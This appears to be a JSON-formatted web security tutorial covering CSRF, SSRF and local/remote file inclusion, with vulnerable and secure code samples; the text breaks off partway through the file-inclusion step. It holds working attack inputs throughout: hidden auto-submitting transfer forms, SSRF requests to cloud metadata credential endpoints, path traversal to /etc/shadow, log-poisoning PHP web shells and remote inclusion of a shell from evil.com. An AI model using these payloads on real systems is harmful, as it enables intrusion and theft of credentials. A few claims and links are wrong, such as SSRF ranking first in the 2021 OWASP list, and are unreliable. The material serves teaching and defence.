{
  "id": "server-side-attacks-csrf-ssrf-file-inclusion",
  "title": "Server-Side Attacks: CSRF, SSRF, and File Inclusion",
  "description": "Master server-side attack techniques including Cross-Site Request Forgery (CSRF), Server-Side Request Forgery (SSRF), and Local/Remote File Inclusion vulnerabilities. Learn exploitation methods, detection techniques, and comprehensive prevention strategies for these critical server-side security flaws.",
  "type": "tutorial",
  "steps": [
    {
      "id": "csrf-fundamentals-exploitation",
      "title": "Cross-Site Request Forgery (CSRF) Fundamentals and Exploitation",
      "content": "OBJECTIVE: Understand CSRF attack mechanics, identify vulnerable applications, and master exploitation techniques for bypassing same-origin policy restrictions.\n\nACADEMIC BACKGROUND:\nCSRF attacks exploit the trust relationship between a user's browser and a web application. Since the browser automatically includes cookies and authentication headers with requests, attackers can trick users into performing unwanted actions. CSRF remains a significant threat despite being known for decades, often combined with XSS for devastating attacks.\n\nSTEP-BY-STEP PROCESS:\n\n1. CSRF Attack Fundamentals:\n\nSame-Origin Policy Bypass:\n```text\nSAME-ORIGIN POLICY:\n- Browser security mechanism\n- Prevents cross-origin requests\n- EXCEPTIONS: Images, scripts, forms can make cross-origin requests\n\nCSRF EXPLOITS THESE EXCEPTIONS:\n- <img src=\"https://victim.com/transfer?to=attacker&amount=1000\">\n- <script src=\"https://victim.com/api/delete?user=123\"></script>\n- <form> tags with hidden inputs and auto-submit\n```\n\nCSRF vs XSS Comparison:\n```text\nCROSS-SITE SCRIPTING (XSS):\n- Injects malicious JavaScript\n- Executes in victim's browser context\n- Can steal cookies, modify DOM, perform actions\n\nCROSS-SITE REQUEST FORGERY (CSRF):\n- Tricks victim into making HTTP requests\n- No JavaScript execution needed\n- Relies on existing authentication\n- Cannot read response data (same-origin policy)\n```\n\n2. CSRF Attack Vectors:\n\nGET-based CSRF:\n```html\n<!-- Simple image-based attack -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" style=\"display:none\">\n\n<!-- Multiple parameters -->\n<img src=\"https://example.com/change-email?new_email=attacker@example.com&confirm=1\">\n\n<!-- URL shortening to hide attack -->\n<img src=\"https://bit.ly/3abc123\">  <!-- Redirects to malicious URL -->\n```\n\nPOST-based CSRF:\n```html\n<!-- Hidden form with auto-submit -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" style=\"display:none\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.forms[0].submit();</script>\n\n<!-- AJAX-based CSRF -->\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://victim.com/api/change-password');\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('new_password=evilpassword');\n</script>\n```\n\nLogin CSRF:\n```html\n<!-- Force user to login with attacker's credentials -->\n<form action=\"https://example.com/login\" method=\"POST\">\n  <input type=\"hidden\" name=\"username\" value=\"attacker\">\n  <input type=\"hidden\" name=\"password\" value=\"attackerpass\">\n  <input type=\"submit\" value=\"Click here to win prize!\">\n</form>\n```\n\nLogout CSRF:\n```html\n<!-- Trick user into logging out -->\n<img src=\"https://example.com/logout\" style=\"display:none\">\n\n<!-- Combined with login CSRF for account takeover -->\n```\n\n3. Advanced CSRF Techniques:\n\nJSON-based CSRF:\n```html\n<!-- Modern web apps use JSON POST -->\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://api.example.com/user/update');\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({\n  \"email\": \"attacker@example.com\",\n  \"name\": \"Hacked\"\n}));\n</script>\n\n<!-- Content-Type must be application/json for some frameworks -->\n```\n\nCSRF with XSS:\n```javascript\n// XSS enables reading CSRF tokens\n// 1. XSS steals CSRF token from page\n// 2. Attacker uses token in CSRF attack\n\nvar token = document.querySelector('input[name=\"csrf_token\"]').value;\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/api/transfer');\nxhr.send('csrf_token=' + token + '&to=attacker&amount=1000');\n```\n\nReferer-based CSRF Protection Bypass:\n```text\nREFERER HEADER CHECKS:\n- Server validates Referer header\n- Must match same origin\n\nBYPASS TECHNIQUES:\n- HTTPS to HTTP downgrade (strips referer)\n- Referer spoofing (not possible in browsers)\n- Open redirect vulnerabilities\n- Protocol-relative URLs\n```\n\n4. CSRF Token Vulnerabilities:\n\nWeak Token Generation:\n```php\n// VULNERABLE: Predictable tokens\n$token = md5(time());  // Timestamp-based\n$token = md5(session_id());  // Session-based (predictable)\n\n// VULNERABLE: Short tokens\n$token = rand();  // Only 32-bit random\n\n// SECURE: Cryptographically secure\n$token = bin2hex(random_bytes(32));\n```\n\nToken Validation Flaws:\n```php\n// VULNERABLE: Token not required for sensitive actions\nif (isset($_POST['csrf_token'])) {\n    // Only check if token exists\n    validate_token($_POST['csrf_token']);\n}\n\n// VULNERABLE: Empty token accepted\nif (empty($_POST['csrf_token']) || validate_token($_POST['csrf_token'])) {\n    // Empty tokens bypass validation\n}\n```\n\nDouble-Submit Cookie Pattern:\n```javascript\n// Client sets both cookie and form field\ndocument.cookie = \"csrf_token=\" + token;\n\n// Server compares cookie and POST parameter\nif ($_COOKIE['csrf_token'] !== $_POST['csrf_token']) {\n    die('CSRF detected');\n}\n```\n\n5. CSRF Testing Methodology:\n\nManual Testing:\n```html\n<!-- Basic CSRF PoC -->\n<html>\n<body>\n  <form action=\"https://victim.com/change-password\" method=\"POST\">\n    <input type=\"hidden\" name=\"new_password\" value=\"hacked123\">\n    <input type=\"submit\" value=\"Click for free iPhone!\">\n  </form>\n</body>\n</html>\n```\n\nAutomated CSRF Testing:\n```bash\n# CSRF testing with curl\ncurl -X POST https://victim.com/change-email \\\n  -H \"Cookie: session=abc123\" \\\n  -d \"new_email=attacker@example.com\"\n\n# Test token validation\n# Remove CSRF token from request\n# Use invalid CSRF token\n# Test token reuse across sessions\n```\n\nFramework-Specific Testing:\n```python\n# Django CSRF testing\nimport requests\n\n# Test missing token\nresponse = requests.post('/api/update', \n  cookies={'session': 'abc123'}, \n  data={'name': 'hacked'})\nassert response.status_code == 403\n\n# Test invalid token\nresponse = requests.post('/api/update', \n  cookies={'session': 'abc123'}, \n  data={'name': 'hacked', 'csrfmiddlewaretoken': 'invalid'})\nassert response.status_code == 403\n```\n\n6. Prevention Strategies:\n\nCSRF Token Implementation:\n```php\n// Generate secure token\n$token = bin2hex(random_bytes(32));\n$_SESSION['csrf_token'] = $token;\n\n// Include in forms\n<input type=\"hidden\" name=\"csrf_token\" value=\"<?php echo $token; ?>\">\n\n// Validate on submission\nif (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {\n    die('CSRF detected');\n}\n```\n\nSameSite Cookies:\n```text\nSAME-SITE COOKIE OPTIONS:\n- Strict: Cookies only sent for same-site requests\n- Lax: Cookies sent for top-level navigation (GET requests)\n- None: Cookies sent for all requests (requires Secure)\n\nIMPLEMENTATION:\nSet-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly\n```\n\nReferer Header Validation:\n```php\n// Check referer header\nfunction validate_referer() {\n    $referer = $_SERVER['HTTP_REFERER'] ?? '';\n    $host = $_SERVER['HTTP_HOST'];\n    \n    if (strpos($referer, $host) !== 0) {\n        die('Invalid referer');\n    }\n}\n```\n\nCustom Headers:\n```javascript\n// Require custom header\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/api/update');\nxhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');\nxhr.send(data);\n\n// Server validation\nif ($_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {\n    die('CSRF detected');\n}\n```\n\nWHAT TO LOOK FOR:\n- **State-Changing Operations**: POST/PUT/DELETE without CSRF protection\n- **Token Implementation**: Missing, weak, or improperly validated tokens\n- **Cookie Configuration**: Missing SameSite, Secure, or HttpOnly flags\n- **Referer Validation**: Inconsistent or missing referer checks\n- **JSON Endpoints**: APIs accepting JSON POST without token validation\n- **Login/Logout Forms**: Authentication endpoints vulnerable to CSRF\n- **Framework Defaults**: Disabled CSRF protection in frameworks\n\nSECURITY IMPLICATIONS:\n- **Account Takeover**: Changing passwords, emails, or security settings\n- **Financial Loss**: Unauthorized money transfers or purchases\n- **Data Manipulation**: Modifying user profiles or application data\n- **Privilege Escalation**: Changing user roles or permissions\n- **System Compromise**: Administrative actions performed by victims\n- **Mass Exploitation**: Attacks affecting multiple users simultaneously\n\nCOMMON PITFALLS:\n- **Token Scope**: Using global tokens instead of per-request tokens\n- **Validation Logic**: Only checking token existence, not validity\n- **Subdomain Issues**: CSRF protection failing across subdomains\n- **HTTPS Downgrades**: Protocol-relative URLs bypassing referer checks\n- **AJAX Requests**: Forgetting CSRF protection on AJAX endpoints\n- **Framework Assumptions**: Not understanding default CSRF behavior\n- **Testing Gaps**: Only testing GET requests, ignoring POST vulnerabilities\n- **Token Leakage**: CSRF tokens exposed through XSS or information disclosure\n\nTOOLS REFERENCE:\n- **OWASP CSRF Tester**: https://owasp.org/www-project-csrf-tester/\n- **Burp Suite**: https://portswigger.net/burp (CSRF testing)\n- **Postman**: https://www.postman.com/ (API CSRF testing)\n- **CSRF PoC Generator**: https://csrf-poc-generator.com/\n- **OWASP ZAP**: https://www.zaproxy.org/ (Automated CSRF scanning)\n\nFURTHER READING:\n- OWASP CSRF: https://owasp.org/www-community/attacks/csrf\n- CSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Origin_Resource_Sharing_Cheat_Sheet.html\n- SameSite Cookies: https://web.dev/samesite-cookies-explained/\n- CSRF Tokens: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html\n- Referer Validation: https://owasp.org/www-community/attacks/HTTP_Request_Smuggling",
      "tags": ["csrf", "cross-site-request-forgery", "same-origin-policy", "authentication-bypass"]
    },
    {
      "id": "ssrf-exploitation-techniques",
      "title": "Server-Side Request Forgery (SSRF) Exploitation Techniques",
      "content": "OBJECTIVE: Master SSRF attack vectors, understand internal network reconnaissance, and learn advanced exploitation techniques for cloud and enterprise environments.\n\nACADEMIC BACKGROUND:\nSSRF vulnerabilities allow attackers to make HTTP requests from the vulnerable server to internal resources. This can lead to internal network scanning, data exfiltration, and complete system compromise. SSRF became #1 in OWASP Top 10 2021 due to its prevalence in cloud applications and microservices architectures.\n\nSTEP-BY-STEP PROCESS:\n\n1. SSRF Fundamentals:\n\nBasic SSRF Concept:\n```php\n// VULNERABLE CODE: URL parameter passed to curl\n$url = $_GET['url'];\n$content = file_get_contents($url);\n\n// ATTACK: Access internal services\n?url=http://localhost/admin\n?url=http://127.0.0.1:3306  // MySQL port\n?url=http://169.254.169.254/  // AWS metadata\n```\n\nSSRF vs CSRF Comparison:\n```text\nSERVER-SIDE REQUEST FORGERY:\n- Server makes HTTP requests to attacker-controlled URLs\n- Can access internal network resources\n- Bypasses firewall restrictions\n- Can read response data\n\nCROSS-SITE REQUEST FORGERY:\n- Victim's browser makes requests to legitimate site\n- Cannot access internal resources\n- Limited by same-origin policy\n- Cannot read response data\n```\n\n2. Internal Network Reconnaissance:\n\nPort Scanning via SSRF:\n```bash\n# Test common internal ports\n?url=http://127.0.0.1:22     # SSH\n?url=http://127.0.0.1:3306   # MySQL\n?url=http://127.0.0.1:5432   # PostgreSQL\n?url=http://127.0.0.1:6379   # Redis\n?url=http://127.0.0.1:27017  # MongoDB\n\n# Service detection by response time\n# Fast response = open port\n# Slow/no response = closed/filtered\n```\n\nService Fingerprinting:\n```text\nHTTP SERVICES:\n?url=http://internal.service:8080/  # Check HTTP response\n?url=http://internal.service:8080/admin  # Check for admin panels\n\nDATABASE SERVICES:\n?url=http://127.0.0.1:3306/  # MySQL protocol response\n?url=http://127.0.0.1:5432/  # PostgreSQL protocol\n\nCLOUD METADATA:\n?url=http://169.254.169.254/latest/meta-data/  # AWS\n?url=http://metadata.google.internal/computeMetadata/v1/  # GCP\n?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure\n```\n\n3. Cloud Metadata Exploitation:\n\nAWS Metadata Service:\n```bash\n# Access IAM credentials\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\n\n# Instance information\n?url=http://169.254.169.254/latest/meta-data/instance-id\n?url=http://169.254.169.254/latest/meta-data/public-ipv4\n?url=http://169.254.169.254/latest/meta-data/security-groups\n\n# User data (custom scripts)\n?url=http://169.254.169.254/latest/user-data\n```\n\nGCP Metadata Service:\n```bash\n# Service account credentials\n?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\n# Project information\n?url=http://metadata.google.internal/computeMetadata/v1/project/project-id\n?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/\n\n# Instance metadata\n?url=http://metadata.google.internal/computeMetadata/v1/instance/hostname\n?url=http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/\n```\n\nAzure Metadata Service:\n```bash\n# Instance metadata\n?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n# Managed identity tokens\n?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n\n# Network information\n?url=http://169.254.169.254/metadata/instance/network?api-version=2021-02-01\n```\n\n4. Advanced SSRF Techniques:\n\nURL Schema Abuse:\n```text\nFILE SCHEME:\n?url=file:///etc/passwd\n?url=file:///c:/windows/system32/drivers/etc/hosts\n\nDICT SCHEME:\n?url=dict://127.0.0.1:6379/info  # Redis info\n?url=dict://127.0.0.1:11211/stats  # Memcached stats\n\nLDAP SCHEME:\n?url=ldap://127.0.0.1:389/%0astats  # LDAP server stats\n?url=ldap://127.0.0.1:389/cn=config  # OpenLDAP config\n\nGOPHER SCHEME:\n?url=gopher://127.0.0.1:6379/_FLUSHALL  # Redis command\n?url=gopher://127.0.0.1:25/_HELO%20evil.com  # SMTP\n```\n\nHost Header Injection:\n```text\nHOST HEADER MANIPULATION:\nGET / HTTP/1.1\nHost: evil.com\n\n# SSRF via host header\nGET /fetch?url=http://evil.com HTTP/1.1\nHost: internal.service\n\n# Password reset poisoning\nPOST /reset-password HTTP/1.1\nHost: evil.com\nemail=victim@legit.com\n```\n\nDNS Rebinding:\n```text\nDNS REBINDING ATTACK:\n1. Attacker controls DNS for evil.com\n2. evil.com initially resolves to attacker's server\n3. Attacker changes DNS to point to internal IP\n4. Browser cache serves old DNS, SSRF hits internal IP\n\nEXPLOITATION:\n?url=http://evil.com.internal.domain\n# evil.com resolves to 127.0.0.1 after initial request\n```\n\n5. SSRF Filter Bypass Techniques:\n\nBlacklist Bypass:\n```text\nIP ADDRESS VARIATIONS:\n?url=http://127.0.0.1/\n?url=http://127.0.0.1:80/\n?url=http://0x7f.0x0.0x0.0x1/\n?url=http://127.0.0.1:80:80/\n?url=http://127.0.0.1:80:443/\n\nDOMAIN VARIATIONS:\n?url=http://localhost/\n?url=http://localhost:80/\n?url=http://0.0.0.0/\n?url=http://0/\n?url=http://127.0.0.1.nip.io/\n```\n\nURL Encoding and Obfuscation:\n```text\nENCODING TECHNIQUES:\n?url=http://127.0.0.1%2f..%2f..%2f..%2f..%2fetc%2fpasswd\n?url=http://127%2e0%2e0%2e1/\n?url=http://127.0.0.1:80:80/\n\nCASE VARIATION:\n?url=http://LocalHost/\n?url=http://LOCALHOST/\n\nREDIRECTS:\n?url=http://evil.com/redirect?to=http://127.0.0.1/\n?url=http://evil.com/302?to=127.0.0.1\n```\n\nProtocol Confusion:\n```text\nHTTPS TO HTTP:\n?url=https://127.0.0.1/\n# Some libraries downgrade to HTTP\n\nWRAPPER SCHEMES:\n?url=php://filter/convert.base64-encode/resource=index.php\n?url=data:text/plain;base64,SSBsb3ZlIFNTUkYK\n\nIDNA DOMAIN:\n?url=http://127.0.0.1.evil.com/\n# IDNA encoding: xn--127.0.0.1-abc.com\n```\n\n6. SSRF Prevention Strategies:\n\nInput Validation:\n```php\n// Whitelist allowed domains\n$allowed_domains = ['api.example.com', 'cdn.example.com'];\n$parsed_url = parse_url($url);\n\nif (!in_array($parsed_url['host'], $allowed_domains)) {\n    die('Invalid domain');\n}\n\n// Block private IP ranges\n$private_ranges = [\n    '127.0.0.0/8',\n    '10.0.0.0/8',\n    '172.16.0.0/12',\n    '192.168.0.0/16',\n    '169.254.0.0/16'  // Link-local\n];\n```\n\nNetwork Segmentation:\n```text\nFIREWALL RULES:\n- Block outbound connections from web servers\n- Allow only necessary external connections\n- Use network ACLs to restrict internal access\n\nSERVICE MESH:\n- Istio, Linkerd for microservices\n- Service-to-service authentication\n- Traffic encryption and authorization\n```\n\nResponse Handling:\n```php\n// Don't expose response content\nfunction fetch_url($url) {\n    $content = file_get_contents($url);\n    // Process content server-side only\n    // Don't return raw response to user\n    return process_content($content);\n}\n\n// Timeout requests\n$context = stream_context_create([\n    'http' => ['timeout' => 5]\n]);\n$content = file_get_contents($url, false, $context);\n```\n\nCloud-Specific Protections:\n```text\nAWS IMDSv2:\n- Require token for metadata access\n- PUT /latest/api/token\n- Use token in subsequent requests\n\nGCP METADATA:\n- Disable metadata service\n- Use service accounts instead\n- Network tags for access control\n\nAZURE IMDS:\n- Require managed identity\n- Network security groups\n- Resource firewall rules\n```\n\n7. SSRF Testing Methodology:\n\nBasic Testing:\n```bash\n# Test localhost access\ncurl \"https://victim.com/fetch?url=http://127.0.0.1/\"\n\n# Test cloud metadata\ncurl \"https://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/\"\n\n# Test internal services\ncurl \"https://victim.com/fetch?url=http://internal.service/\"\n```\n\nAdvanced Testing:\n```python\n# Python SSRF testing script\nimport requests\n\npayloads = [\n    'http://127.0.0.1/',\n    'http://localhost/',\n    'http://0.0.0.0/',\n    'http://169.254.169.254/latest/meta-data/',\n    'file:///etc/passwd',\n    'dict://127.0.0.1:6379/info'\n]\n\nfor payload in payloads:\n    try:\n        response = requests.get(f'https://victim.com/fetch?url={payload}', timeout=5)\n        if response.status_code == 200:\n            print(f'Vulnerable: {payload}')\n            print(response.text[:200])\n    except:\n        pass\n```\n\nWHAT TO LOOK FOR:\n- **URL Parameters**: Any parameter accepting URLs for fetching content\n- **API Endpoints**: REST APIs that proxy requests or fetch resources\n- **Image Processing**: Services that download and process images\n- **Document Conversion**: Services that fetch and convert documents\n- **Webhook Handlers**: Systems processing webhook payloads with URLs\n- **Import Functions**: Features that import data from external URLs\n- **Proxy Features**: Built-in proxy functionality in applications\n\nSECURITY IMPLICATIONS:\n- **Internal Network Compromise**: Access to internal services and databases\n- **Data Exfiltration**: Stealing sensitive internal data and credentials\n- **Cloud Account Takeover**: Accessing cloud metadata and IAM credentials\n- **Service Disruption**: Denial of service against internal infrastructure\n- **Lateral Movement**: Pivoting from web server to internal network\n- **Supply Chain Attacks**: Compromising internal CI/CD pipelines\n\nCOMMON PITFALLS:\n- **Incomplete Blacklists**: Missing IPv6, new TLDs, or encoding variations\n- **Redirect Vulnerabilities**: Not following redirects safely\n- **Protocol Confusion**: Allowing dangerous schemes (file://, dict://, etc.)\n- **Timeout Issues**: Long timeouts allowing slowloris-style attacks\n- **Response Processing**: Displaying or processing response content unsafely\n- **Cloud Configurations**: Default permissive metadata service access\n- **Microservices**: SSRF between services in containerized environments\n- **DNS Resolution**: Not validating resolved IP addresses\n\nTOOLS REFERENCE:\n- **SSRFmap**: https://github.com/swisskyrepo/SSRFmap (SSRF automation)\n- **Gopherus**: https://github.com/tarunkant/Gopherus (Gopher payload generation)\n- **Burp Collaborator**: https://portswigger.net/burp (Out-of-band testing)\n- **Interactsh**: https://github.com/projectdiscovery/interactsh (OOB interaction server)\n- **Nuclei**: https://github.com/projectnuclei/nuclei (SSRF template scanning)\n\nFURTHER READING:\n- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n- SSRF Bible: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/\n- Cloud Metadata Attacks: https://blog.appsecco.com/cloud-metadata-attacks/\n- SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n- AWS IMDSv2: https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service",
      "tags": ["ssrf", "server-side-request-forgery", "cloud-metadata", "internal-network", "network-scanning"]
    },
    {
      "id": "file-inclusion-attacks-lfi-rfi",
      "title": "Local and Remote File Inclusion (LFI/RFI) Attacks",
      "content": "OBJECTIVE: Master file inclusion vulnerabilities, understand PHP and other language-specific implementations, and learn advanced exploitation techniques for local and remote file inclusion attacks.\n\nACADEMIC BACKGROUND:\nFile inclusion vulnerabilities allow attackers to include and execute arbitrary files on the server. LFI (Local File Inclusion) includes files from the local filesystem, while RFI (Remote File Inclusion) includes files from remote servers. These vulnerabilities can lead to code execution, data disclosure, and complete server compromise.\n\nSTEP-BY-STEP PROCESS:\n\n1. File Inclusion Fundamentals:\n\nBasic LFI Concept:\n```php\n// VULNERABLE CODE\n$page = $_GET['page'];\ninclude($page . '.php');\n\n// ATTACK: Include arbitrary local files\n?page=../../../etc/passwd\n?page=php://filter/convert.base64-encode/resource=index\n?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\n```\n\nRFI vs LFI:\n```text\nLOCAL FILE INCLUSION (LFI):\n- Includes files from local filesystem\n- Limited to server's file system\n- Often requires directory traversal\n- Can lead to code execution via wrappers\n\nREMOTE FILE INCLUSION (RFI):\n- Includes files from remote URLs\n- Requires allow_url_include=On (PHP)\n- Direct code execution possible\n- More dangerous but less common now\n```\n\n2. Directory Traversal Techniques:\n\nBasic Traversal:\n```text\nUNIX/LINUX:\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/shadow\n\nWINDOWS:\n..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n..\\..\\..\\windows\\win.ini\n..\\..\\..\\boot.ini\n\nENCODING:\n..%2f..%2f..%2fetc%2fpasswd\n..%5c..%5c..%5cwindows%5cwin.ini\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n```\n\nNull Byte Injection:\n```php\n// OLD PHP VERSIONS: Null byte terminates string\n$page = $_GET['page'];\ninclude($page . '.php');\n\n// ATTACK: Null byte bypasses extension\n?page=../../../etc/passwd%00\n// Becomes: ../../../etc/passwd.php (but null byte stops at .php)\n```\n\nDouble Encoding:\n```text\nURL DOUBLE ENCODING:\n..%252f..%252f..%252fetc%252fpasswd\n// %25 = %, so %252f = %2f = /\n\nUTF-8 ENCODING:\n..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\n// %c0%af = /\n```\n\n3. PHP Wrappers Exploitation:\n\nPHP Filter Wrapper:\n```php\n// Read file with base64 encoding\n?page=php://filter/convert.base64-encode/resource=index\n\n// Multiple filters\n?page=php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16/resource=index\n\n// String filters\n?page=php://filter/read=string.rot13/resource=index\n?page=php://filter/read=string.toupper/resource=config\n```\n\nPHP Data Wrapper:\n```php\n// Execute PHP code directly\n?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\n\n// Base64 decoded: <?php phpinfo(); ?>\n\n// Alternative formats\n?page=data:text/plain,<?php phpinfo(); ?>\n?page=data:;base64,PD9waHAgZWNobyAiSGVsbG8iOyA/Pg==\n```\n\nPHP Input Wrapper:\n```php\n// Read POST data as PHP\n?page=php://input\n// POST: <?php phpinfo(); ?>\n\n// With content type\n?page=php://input&cmd=php://input\n// Content-Type: text/plain\n// Body: <?php system($_GET['cmd']); ?>\n```\n\nOther PHP Wrappers:\n```php\n// ZIP wrapper\n?page=zip://archive.zip#file.txt\n\n// PHAR wrapper (deserialization)\n?page=phar://evil.phar/file\n\n// Expect wrapper\n?page=expect://id\n\n// FTP/HTTP wrappers\n?page=http://evil.com/shell.txt\n?page=ftp://evil.com/shell.txt\n```\n\n4. Log Poisoning Techniques:\n\nApache Access Log Poisoning:\n```bash\n# Inject PHP code into User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://victim.com/\n\n# Access log inclusion\n?page=../../../var/log/apache2/access.log&cmd=id\n```\n\nSSH Log Poisoning:\n```bash\n# Connect with malicious username\nssh '<?php system($_GET[\"cmd\"]); ?>'@victim.com\n\n# Include auth log\n?page=../../../var/log/auth.log&cmd=id\n```\n\nMail Log Poisoning:\n```bash\n# Send email with PHP payload\nsendmail victim@target.com < payload.txt\n\n# Include mail log\n?page=../../../var/log/mail.log&cmd=id\n```\n\n5. Advanced LFI Techniques:\n\n/proc/self/environ Inclusion:\n```bash\n# Environment variables\n?page=../../../proc/self/environ\n\n# Poison User-Agent first\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://victim.com/\n?page=../../../proc/self/environ&cmd=id\n```\n\n/proc/self/cmdline:\n```bash\n# Process command line\n?page=../../../proc/self/cmdline\n\n# Shows full command that started PHP\n# Useful for understanding server setup\n```\n\n/proc/self/fd Directory:\n```bash\n# File descriptors\n?page=../../../proc/self/fd/0  # stdin\n?page=../../../proc/self/fd/1  # stdout\n?page=../../../proc/self/fd/2  # stderr\n?page=../../../proc/self/fd/3  # First opened file\n```\n\nSession Files Inclusion:\n```bash\n# PHP session files\n?page=../../../var/lib/php/sessions/sess_abc123\n\n# Store payload in session first\n# Then include session file\n```\n\n6. RFI Exploitation:\n\nBasic RFI:\n```php\n// Requires allow_url_include=On\n$page = $_GET['page'];\ninclude($page);\n\n// ATTACK: Remote code execution\n?page=http://evil.com/shell.txt\n\n// Shell content:\n<?php\nsystem(\\$_GET['cmd']);\n?>\n```\n\nRFI with Null Byte:\n```php\n// Extension appended but null byte stops it\ninclude($page . '.php');\n\n// ATTACK\n?page=http://evil.com/shell.txt%00\n// Includes: http://evil.com/shell.txt (null byte stops .php)\n```\n\nRFI Filter Bypass:\n```text\nDOMAIN VARIATIONS:\n?page=http://evil.com:80/shell.txt\n?page=http://evil.com./shell.txt\n?page=http://evil.com:80:443/shell.txt\n\nPROTOCOLS:\n?page=https://evil.com/shell.txt\n?page=ftp://evil.com/shell.txt\n?page=gopher://evil.com/shell.txt\n```\n\n7. File Inclusion Prevention:\n\nInput Validation:\n```php\n// Whitelist approach\n$allowed_pages = ['home', 'about', 'contact'];\n$page = $_GET['page'];\n\nif (!in_array($page, $allowed_pages)) {\n    $page = 'home';\n}\n\ninclude($page . '.php');\n```\n\nPath Sanitization:\n```php\n// Remove dangerous characters\nfunction sanitize_path($path) {\n    // Remove .. and dangerous chars\n    $path = str_replace(['..', '/', '\\\\'], '', $path);\n    return $path;\n}\n\n// Better: Use realpath()\n$real_path = realpath($base_dir . '/' . $page);\nif (strpos($real_path, $base_dir) !== 0) {\n    die('Invalid path');\n}\n```\n\nPHP Configuration:\n```ini\n; Disable remote includes\nallow_url_include = Off\n\n; Disable dangerous wrappers\nallow_url_fopen = Off\n\n; Open_basedir restriction\nopen_basedir = /var/www/html/\n```\n\nSecure Coding Practices:\n```php\n// Use absolute paths\n$base_dir = '/var/www/html/pages/';\n$page = basename($_GET['page']);  // Remove path components\n$full_path = $base_dir . $page . '.php';\n\nif (file_exists($full_path)) {\n    include($full_path);\n} else {\n    include($base_dir . '404.php');\n}\n```\n\n8. Testing Methodology:\n\nBasic LFI Testing:\n```bash\n# Directory traversal\ncurl \"http://victim.com/page.php?page=../../../etc/passwd\"\n\n# Filter wrapper\ncurl \"http://victim.com/page.php?page=php://filter/convert.base64-encode/resource=index\"\n\n# Data wrapper\ncurl \"http://victim.com/page.php?page=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\"\n```\n\nRFI Testing:\n```bash\n# Remote inclusion\ncurl \"http://victim.com/page.php?page=http://evil.com/shell.txt\"\n\n# With null byte\ncurl \"http://victim.com/page.php?page=http://evil.com/shell.txt%00\"\n```\n\nLog Poisoning Testing:\n```bash\n# Poison access log\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://victim.com/\n\n# Include poisoned log\ncurl \"http://victim.com/page.php?page=../../../var/log/apache2/access.log&cmd=id\"\n```\n\nAutomated Testing:\n```bash\n# LFI/RFI scanner\nlfi-rfi-scanner.py -u \"http://victim.com/page.php?page=\" -w wordlist.txt\n\n# Custom testing script\nfor payload in ../../../etc/passwd php://filter/convert.base64-encode/resource=index; do\n  response=$(curl -s \"http://victim.com/page.php?page=$payload\")\n  if [[ $response =~ \"root:\" ]]; then\n    echo \"VULNERABLE: $payload\"\n  fi\ndone\n```\n\nWHAT TO LOOK FOR:\n- **Include Functions**: include(), require(), include_once(), require_once()\n- **Dynamic File Paths**: User-controlled paths in file operations\n- **Template Engines**: Similar vulnerabilities in other languages\n- **Configuration Files**: PHP settings allowing dangerous operations\n- **Log Files**: Writable log files that can be poisoned\n- **Session Storage**: PHP session files in predictable locations\n- **Backup Files**: .bak, .old, .orig files containing sensitive code\n\nSECURITY IMPLICATIONS:\n- **Code Execution**: Arbitrary PHP/code execution on server\n- **Data Disclosure**: Reading sensitive files and configuration\n- **Server Compromise**: Complete control over web server\n- **Privilege Escalation**: Gaining system-level access\n- **Data Exfiltration**: Stealing databases, credentials, source code\n- **Denial of Service**: Resource exhaustion through file operations\n\nCOMMON PITFALLS:\n- **Extension Validation**: Only checking file extensions, not actual content\n- **Path Sanitization**: Incomplete removal of dangerous path components\n- **Wrapper Awareness**: Not understanding all available PHP wrappers\n- **Log Rotation**: Poisoned logs being rotated and becoming inaccessible\n- **Null Byte Protection**: Modern PHP versions not vulnerable to null bytes\n- **Open_basedir**: Can be bypassed in some configurations\n- **Error Handling**: Verbose errors revealing file system structure\n- **Backup Files**: Developers leaving backup files accessible\n\nTOOLS 